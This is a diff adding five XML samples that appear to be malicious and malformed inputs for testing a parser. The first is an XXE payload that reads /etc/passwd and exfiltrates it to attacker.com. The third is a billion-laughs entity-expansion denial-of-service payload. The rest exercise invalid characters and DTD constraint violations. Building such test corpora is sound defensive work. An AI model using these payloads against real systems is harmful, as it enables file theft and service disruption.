@@ -1,0 +1,75 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?%xxe;'>">
+  %eval;
+  %exfiltrate;
+]>
+<root>&xxe;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE config [
+  <!ELEMENT config (item+)>
+  <!ELEMENT item (#PCDATA|subitem)*>
+  <!ELEMENT subitem ANY>
+  <!ATTLIST item id ID #REQUIRED>
+  <!ATTLIST item ref IDREF #IMPLIED>
+]>
+<config>
+  <item id="i1" ref="i2">text1</item>
+  <item id="i2"><subitem>&#x00;</subitem>nested&#x0D;&#x0A;content</item>
+  <item id="i3" ref="i1">&#xFFFF;</item>
+</config>
+```
+
+```xml
+<!DOCTYPE root [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<root>&lol4;</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!NOTATION gif PUBLIC "image/gif">
+  <!NOTATION jpeg SYSTEM "image/jpeg">
+  <!ELEMENT data (binary)*>
+  <!ELEMENT binary EMPTY>
+  <!ATTLIST binary 
+    content CDATA #REQUIRED
+    encoding (base64|hex|raw) "raw"
+    notation NOTATION (gif|jpeg) #IMPLIED>
+]>
+<data>
+  <binary content="&#x00;&#xFF;&#x80;" encoding="hex" notation="gif"/>
+  <binary content="" encoding="base64"/>
+  <binary content="test&#13;&#10;data"/>
+</data>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root (a|b|c)*>
+  <!ELEMENT a (b)>
+  <!ELEMENT b (c)>
+  <!ELEMENT c (#PCDATA)>
+  <!ATTLIST root xmlns:custom CDATA #IMPLIED>
+  <!ATTLIST a attr CDATA #FIXED "fixed_value">
+]>
+<root xmlns:custom="http://example.com/custom" custom:attr="value">
+  <a attr="should_fail_fixed">
+    <b>
+      <c>deeply nested</c>
+    </b>
+  </a>
+  <c>orphan</c>
+</root>
+```
